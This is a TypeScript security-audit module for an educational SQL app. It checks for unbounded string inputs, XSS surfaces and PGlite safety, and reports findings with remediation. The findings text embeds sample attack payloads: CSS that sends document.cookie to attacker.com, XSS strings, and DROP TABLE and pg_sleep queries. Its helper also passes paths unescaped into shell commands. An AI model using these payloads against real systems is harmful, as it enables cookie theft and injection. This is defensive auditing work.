import { readFileSync, existsSync } from 'fs'
import { execSync } from 'child_process'
import { join, relative } from 'path'
import type { Finding, TestModule, RunOptions, TestResult } from '../types'

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const SKIP_DIRS = new Set(['node_modules', 'dist', '.git', 'target', '.cache'])

// User ID fields are fixed-format external IDs — length limits don't apply
const USER_ID_FIELD_SKIP = new Set(['userId', 'teacherUserId', 'studentUserId'])

// Known user-controlled string fields stored without length constraints.
// React's default escaping mitigates DOM-based XSS for most of these.
const KNOWN_UNBOUNDED_FIELDS: ReadonlyArray<{
  field: string
  location: string
}> = [
  { field: 'fullName', location: 'convex/users.ts (upsertProfile)' },
  { field: 'customThemeCss', location: 'convex/users.ts (updateSettings)' },
  {
    field: 'name (class)',
    location: 'convex/classes.ts (createClass / updateClass)',
  },
  {
    field: 'description (class)',
    location: 'convex/classes.ts (createClass / updateClass)',
  },
  { field: 'content (note)', location: 'convex/teacherNotes.ts (createNote)' },
  {
    field: 'note (assignment)',
    location: 'convex/assignments.ts (createAssignment)',
  },
]

// ---------------------------------------------------------------------------
// Directory walker
// ---------------------------------------------------------------------------

function walkDir(dir: string, extensions: ReadonlySet<string>): string[] {
  const results: string[] = []

  let entries: string[]
  try {
    const output = execSync(`ls -1a "${dir}"`, {
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe'],
    })
    entries = output
      .split('\n')
      .filter((e) => e.length > 0 && e !== '.' && e !== '..')
  } catch {
    return results
  }

  for (const entry of entries) {
    if (SKIP_DIRS.has(entry)) continue

    const fullPath = join(dir, entry)

    let isDir = false
    try {
      execSync(`test -d "${fullPath}"`, { stdio: 'pipe' })
      isDir = true
    } catch {
      isDir = false
    }

    if (isDir) {
      results.push(...walkDir(fullPath, extensions))
    } else {
      const dotIdx = entry.lastIndexOf('.')
      if (dotIdx >= 0) {
        const ext = entry.slice(dotIdx).toLowerCase()
        if (extensions.has(ext)) {
          results.push(fullPath)
        }
      }
    }
  }

  return results
}

// ---------------------------------------------------------------------------
// Check 1: Unbounded v.string() validators in Convex files
// ---------------------------------------------------------------------------

interface UnboundedField {
  readonly functionName: string
  readonly fieldName: string
  readonly file: string
  readonly line: number
}

/**
 * Scan a single Convex .ts file for mutation/query function definitions and
 * collect v.string() args fields that have no length constraint.
 *
 * Strategy:
 *   1. Locate export const <name> = mutation/query({ blocks
 *   2. Within that block's args section, find lines with `fieldName: v.string()`
 *   3. Skip known user-ID fields (fixed-format IDs)
 */
function extractUnboundedFields(
  content: string,
  filePath: string,
): UnboundedField[] {
  const found: UnboundedField[] = []
  const lines = content.split('\n')

  // Regex to detect function start: export const <name> = mutation({ or query({
  const functionStartRe =
    /export\s+const\s+(\w+)\s*=\s*(?:mutation|query)\s*\(\s*\{/
  // Regex for a v.string() arg without any refinement
  // Matches: someField: v.string()
  // Does NOT match: v.string().max or v.optional(v.string()) followed by length note
  const unboundedStringRe =
    /^\s*(\w+)\s*:\s*v\.(?:optional\s*\(\s*v\.)?string\s*\(\s*\)\s*\)?\s*,?\s*(?:\/\/.*)?$/

  let currentFunctionName: string | null = null
  let inArgs = false
  let braceDepth = 0

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i]

    // Detect function start
    const funcMatch = functionStartRe.exec(line)
    if (funcMatch) {
      currentFunctionName = funcMatch[1]
      inArgs = false
      braceDepth = 0
      continue
    }

    if (currentFunctionName === null) continue

    // Detect args block start
    if (!inArgs && /\bargs\s*:\s*\{/.test(line)) {
      inArgs = true
      braceDepth = 0
      // Count braces on this line
      for (const ch of line) {
        if (ch === '{') braceDepth++
        else if (ch === '}') braceDepth--
      }
      continue
    }

    if (!inArgs) continue

    // Track brace depth to know when args block ends
    let lineBreakOut = false
    for (const ch of line) {
      if (ch === '{') braceDepth++
      else if (ch === '}') {
        braceDepth--
        if (braceDepth <= 0) {
          lineBreakOut = true
          break
        }
      }
    }

    if (lineBreakOut) {
      inArgs = false
      currentFunctionName = null
      continue
    }

    // Check for unbounded v.string() on this line
    const fieldMatch = unboundedStringRe.exec(line)
    if (fieldMatch) {
      const fieldName = fieldMatch[1]

      // Skip user-ID fields
      if (USER_ID_FIELD_SKIP.has(fieldName)) continue

      found.push({
        functionName: currentFunctionName,
        fieldName,
        file: filePath,
        line: i + 1,
      })
    }
  }

  return found
}

interface UnboundedCheckResult {
  readonly findings: readonly Finding[]
  readonly passed: boolean
}

async function checkUnboundedStringValidators(
  projectRoot: string,
): Promise<UnboundedCheckResult> {
  const convexDir = join(projectRoot, 'convex')

  if (!existsSync(convexDir)) {
    return { findings: [], passed: true }
  }

  const tsFiles = walkDir(convexDir, new Set(['.ts'])).filter(
    (f) => !f.includes('_generated'),
  )

  // Group by function to avoid flooding
  const byFunction = new Map<string, UnboundedField[]>()

  for (const filePath of tsFiles) {
    let content: string
    try {
      content = readFileSync(filePath, 'utf8')
    } catch {
      continue
    }

    const relPath = relative(projectRoot, filePath)
    const fields = extractUnboundedFields(content, relPath)

    for (const field of fields) {
      const key = `${field.file}::${field.functionName}`
      const existing = byFunction.get(key)
      if (existing) {
        existing.push(field)
      } else {
        byFunction.set(key, [field])
      }
    }
  }

  const findings: Finding[] = []
  let idx = 0

  for (const [, fields] of byFunction) {
    const first = fields[0]
    const allFieldNames = fields
      .map((f) => `${f.fieldName} (line ${f.line})`)
      .join(', ')

    findings.push({
      id: `INPUT-VAL-${String(idx).padStart(3, '0')}`,
      severity: 'MEDIUM',
      category: 'Input Validation',
      title: `Unbounded v.string() fields in ${first.functionName}`,
      location: `${first.file}:${first.line}`,
      description:
        `The Convex function "${first.functionName}" accepts the following string fields ` +
        `without explicit length constraints: ${allFieldNames}. ` +
        `Without max-length validation, a malicious caller can submit arbitrarily large payloads, ` +
        `exhausting database storage or causing excessive compute.`,
      proofOfConcept:
        `Call ${first.functionName} with a payload like: ` +
        `{ ${first.fieldName}: "A".repeat(100_000) } — Convex will accept and store it.`,
      impact:
        'Unlimited-length strings can be used for storage exhaustion and may render UI unusable ' +
        'when displayed without truncation.',
      remediation:
        'Wrap each string field with a max-length check in the mutation handler, or switch to a ' +
        'schema-level validator (e.g. add a custom Convex validator that enforces v.string() with ' +
        'a business-appropriate length limit such as 500 chars for names, 10 000 for content fields).',
    })

    idx++
  }

  return { findings, passed: findings.length === 0 }
}

// ---------------------------------------------------------------------------
// Check 2: XSS Surface Analysis
// ---------------------------------------------------------------------------

interface XssCheckResult {
  readonly findings: readonly Finding[]
  readonly highFindingsCount: number
}

async function checkXssSurface(projectRoot: string): Promise<XssCheckResult> {
  const srcDir = join(projectRoot, 'src')
  const findings: Finding[] = []

  if (!existsSync(srcDir)) {
    return { findings, highFindingsCount: 0 }
  }

  const uiFiles = walkDir(srcDir, new Set(['.tsx', '.jsx']))

  // 2a. dangerouslySetInnerHTML usage (HIGH)
  const dangerousHtmlFiles: Array<{ file: string; line: number }> = []

  for (const filePath of uiFiles) {
    let content: string
    try {
      content = readFileSync(filePath, 'utf8')
    } catch {
      continue
    }

    const relPath = relative(projectRoot, filePath)
    const lines = content.split('\n')

    for (let i = 0; i < lines.length; i++) {
      if (lines[i].includes('dangerouslySetInnerHTML')) {
        dangerousHtmlFiles.push({ file: relPath, line: i + 1 })
      }
    }
  }

  let dangerousHtmlIdx = 0
  for (const hit of dangerousHtmlFiles) {
    findings.push({
      id: `XSS-${String(dangerousHtmlIdx).padStart(3, '0')}`,
      severity: 'HIGH',
      category: 'XSS Surface',
      title: 'dangerouslySetInnerHTML usage found',
      location: `${hit.file}:${hit.line}`,
      description:
        "React's dangerouslySetInnerHTML bypasses its default HTML escaping and renders " +
        'raw HTML strings directly into the DOM. If any user-controlled data flows into ' +
        'the `__html` property it enables stored or reflected XSS.',
      proofOfConcept:
        `File: ${hit.file} line ${hit.line}\n` +
        'If user data reaches __html: <img src=x onerror=alert(1)> will execute.',
      impact:
        'Successful XSS in a Tauri app can escape the WebView sandbox via Tauri IPC commands ' +
        'and gain access to the host filesystem.',
      remediation:
        'Eliminate dangerouslySetInnerHTML where possible. If HTML rendering is required, ' +
        'sanitize input with DOMPurify before passing it to __html. ' +
        'Prefer rendering plain text or structured JSX.',
    })
    dangerousHtmlIdx++
  }

  const highFindingsCount = dangerousHtmlFiles.length

  // 2b. customThemeCss injection risk (MEDIUM)
  // User-controlled CSS is stored verbatim — url() can exfiltrate data to attacker-controlled servers
  findings.push({
    id: 'XSS-CSS-001',
    severity: 'MEDIUM',
    category: 'XSS Surface',
    title:
      'User-controlled customThemeCss stored and injected without sanitization',
    location: 'convex/users.ts (updateSettings) → src/lib/db/convex-db.ts',
    description:
      'The `customThemeCss` field is accepted as a raw string via the `updateSettings` mutation ' +
      'and injected into the page as a <style> block or CSS variable without any sanitization. ' +
      'An attacker can use CSS url() to exfiltrate data to an external server ' +
      "(e.g. body { background: url('https://attacker.com/?cookie=' + document.cookie) }) " +
      'or perform UI redressing.',
    proofOfConcept:
      "POST to updateSettings: { customThemeCss: 'body { background-image: url(//attacker.com) }' }\n" +
      'The browser will make a request to attacker.com when the page loads.',
    impact:
      'CSS injection can be used for data exfiltration, click-jacking overlays, and phishing. ' +
      'In a Tauri context, CSS url() requests originate from the app WebView.',
    remediation:
      'Sanitize customThemeCss server-side before storage. Allowlist safe CSS properties, ' +
      'or use a CSS parser to strip url() calls and expression() constructs. ' +
      'Alternatively, constrain the feature to a predefined list of named themes.',
  })

  // 2c. Known user-controlled fields stored unsanitized (MEDIUM, mitigated by React escaping)
  const fieldList = KNOWN_UNBOUNDED_FIELDS.map(
    (f) => `${f.field} (${f.location})`,
  ).join('; ')

  findings.push({
    id: 'XSS-STORED-001',
    severity: 'MEDIUM',
    category: 'XSS Surface',
    title: 'User-controlled text fields stored unsanitized',
    location: 'convex/ (multiple mutations)',
    description:
      'The following user-controlled string fields are stored in Convex without server-side ' +
      `sanitization: ${fieldList}. ` +
      "React's default JSX rendering escapes HTML, which mitigates DOM-based XSS for most " +
      'display paths. However, if any of these values are ever used in dangerouslySetInnerHTML, ' +
      'href attributes (javascript: scheme), or injected into CSS, XSS becomes possible.',
    proofOfConcept:
      "Store fullName = '<script>alert(1)</script>' via upsertProfile.\n" +
      'React will render this as escaped text (&lt;script&gt;...) — no execution.\n' +
      'Risk escalates if value reaches dangerouslySetInnerHTML or a CSS injection point.',
    impact:
      'Low impact currently due to React escaping. Risk increases if rendering code changes ' +
      'to use raw HTML output or if stored values are used in other unsanitized contexts.',
    remediation:
      'Sanitize display-name and free-text fields at write time (strip or encode HTML). ' +
      'Maintain a review policy that flags any new use of dangerouslySetInnerHTML with ' +
      'user-provided data. Consider adding a Content-Security-Policy that blocks inline scripts.',
  })

  return { findings, highFindingsCount }
}

// ---------------------------------------------------------------------------
// Check 3: PGlite Safety
// ---------------------------------------------------------------------------

interface PgliteCheckResult {
  readonly findings: readonly Finding[]
  readonly passed: boolean
}

async function checkPgliteSafety(
  projectRoot: string,
): Promise<PgliteCheckResult> {
  const pglitePath = join(projectRoot, 'src', 'lib', 'db', 'pglite.ts')
  const findings: Finding[] = []

  if (!existsSync(pglitePath)) {
    return { findings, passed: true }
  }

  let content: string
  try {
    content = readFileSync(pglitePath, 'utf8')
  } catch {
    return { findings, passed: true }
  }

  const relPath = relative(projectRoot, pglitePath)

  // 3a. Row capping check — look for LIMIT followed by a large number
  const hasRowCap =
    /LIMIT\s+(?:\d{4,}|\$\{MAX_STUDENT_ROWS\}|\$\{\w+\})/i.test(content) ||
    /MAX_STUDENT_ROWS/.test(content)

  if (!hasRowCap) {
    findings.push({
      id: 'PGLITE-001',
      severity: 'MEDIUM',
      category: 'PGlite Safety',
      title: 'No row-count cap detected in executeQuery',
      location: `${relPath} (executeQuery)`,
      description:
        "PGlite runs in the browser using the user's own memory. Without a row cap, " +
        'a student query with an accidental cross-join (e.g. SELECT * FROM animals, caretakers) ' +
        'can produce millions of rows, exhausting RAM and crashing the tab.',
      proofOfConcept:
        'SELECT * FROM animals, caretakers -- produces N*M rows with no limit',
      impact:
        'Browser tab OOM crash. No data exfiltration risk since PGlite is entirely client-local.',
      remediation:
        'Wrap all student queries in a subquery with LIMIT N+1 and throw a user-friendly error ' +
        'if the row count exceeds N (e.g. 5000).',
    })
  }

  // 3b. Query timeout check — look for statement_timeout or AbortController/setTimeout around queries
  const hasStatementTimeout = /statement_timeout/i.test(content)
  const hasAbortController = /AbortController/i.test(content)
  const hasSetTimeout = /setTimeout\s*\(/.test(content)
  const hasQueryTimeout =
    hasStatementTimeout || hasAbortController || hasSetTimeout

  if (!hasQueryTimeout) {
    findings.push({
      id: 'PGLITE-002',
      severity: 'LOW',
      category: 'PGlite Safety',
      title: 'No query timeout mechanism detected in PGlite initialization',
      location: `${relPath} (initializeDb)`,
      description:
        'PGlite does not appear to set a query timeout (statement_timeout, AbortController, or ' +
        'setTimeout-based cancellation). A slow or pathological query (e.g. recursive CTE or ' +
        'very large cross-join) can stall the UI thread indefinitely.',
      proofOfConcept:
        'SELECT pg_sleep(60) -- will hang the browser tab until the page is closed',
      impact:
        'Poor user experience (unresponsive UI). No security impact as PGlite is in-browser only.',
      remediation:
        "Set a statement timeout at initialization time: await db.exec('SET statement_timeout = 5000'). " +
        "Handle the error and surface a user-friendly 'Query timed out' message.",
    })
  }

  // 3c. Informational note: PGlite is in-browser — SQL injection is self-harm
  findings.push({
    id: 'PGLITE-INFO-001',
    severity: 'INFO',
    category: 'PGlite Safety',
    title: 'PGlite is in-browser by design — SQL injection is self-harm',
    location: relPath,
    description:
      "PGlite runs entirely within the user's browser using WebAssembly. " +
      'The database is local to the current user and contains no data from other users. ' +
      "SQL injection in student-submitted queries can only affect the attacker's own session data — " +
      'there is no shared backend to compromise.',
    proofOfConcept:
      "DROP TABLE animals; -- destroys the attacker's own data, not other users' data.",
    impact:
      "No confidentiality, integrity, or availability impact beyond the attacker's own local session.",
    remediation:
      'No action required for multi-user security. The table-name whitelist in isValidTableName() ' +
      'is good practice for protecting the importCSV path. Continue validating all dynamic ' +
      'SQL identifiers against the whitelist.',
  })

  const passed = !hasRowCap
    ? false
    : findings.filter((f) => f.severity !== 'INFO').length === 0

  return { findings, passed }
}

// ---------------------------------------------------------------------------
// TestModule export
// ---------------------------------------------------------------------------

async function run(options: RunOptions): Promise<TestResult> {
  const start = Date.now()
  const { projectRoot } = options
  const allFindings: Finding[] = []
  let passCount = 0

  // --- Check 1: Unbounded string validators in Convex ---
  const unboundedResult = await checkUnboundedStringValidators(projectRoot)
  allFindings.push(...unboundedResult.findings)
  if (unboundedResult.passed) {
    passCount++
  }

  // --- Check 2: XSS surface analysis ---
  const xssResult = await checkXssSurface(projectRoot)
  allFindings.push(...xssResult.findings)
  // Pass +1 if no HIGH-severity dangerouslySetInnerHTML findings
  if (xssResult.highFindingsCount === 0) {
    passCount++
  }

  // --- Check 3: PGlite safety ---
  const pgliteResult = await checkPgliteSafety(projectRoot)
  allFindings.push(...pgliteResult.findings)
  if (pgliteResult.passed) {
    passCount++
  }

  return {
    category: 'Input Validation',
    findings: allFindings,
    passCount,
    duration: Date.now() - start,
  }
}

export const inputValidation: TestModule = {
  name: 'input-validation',
  description:
    'Checks Convex mutations for unbounded v.string() validators, scans UI files for XSS surfaces ' +
    '(dangerouslySetInnerHTML, CSS injection), and audits PGlite for row-cap and timeout safety.',
  run,
}
